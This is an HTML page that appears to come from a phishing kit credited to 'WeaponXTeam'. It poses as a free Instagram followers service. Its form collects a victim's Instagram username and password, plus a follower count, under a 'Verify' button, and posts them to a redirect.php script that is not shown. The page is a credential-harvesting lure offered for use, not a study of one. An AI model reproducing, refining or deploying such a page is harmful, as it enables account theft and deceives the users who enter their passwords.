//Devloper : WeaponXTeam
//Website : https://instagram.com/satyam.sourabh.hacker
//C@right : XTeam


<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='img/mod.png' rel='icon' type='image/x-png'/>
<title>WeaponXTeam Instagram Followers</title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="css/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/background.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>
<div style="border: 1px pink solid; padding: 10px; background-color:pink; text-align: left"><center><font size="5"><font color="white">WeaponXTeam Instagram Followers</font></font></center> </div>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

</div>
<div class="col-md-8">
</br>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:white;width:100%" class="form-horizontal">
<form action="redirect.php" method="POST">
<div style="width:100%" class="form-group">
  <input class="form-control" name="instaName" placeholder="Username" type="text" required>
</div>  
<div style="width:100%" class="form-group">
  <input class="form-control" name="pass" placeholder="Password" type="passwords" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="followers"  placeholder="Followers" type="number" required>
</div>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color:pink;" id="gsubmit" value="Verify"> </form>

  


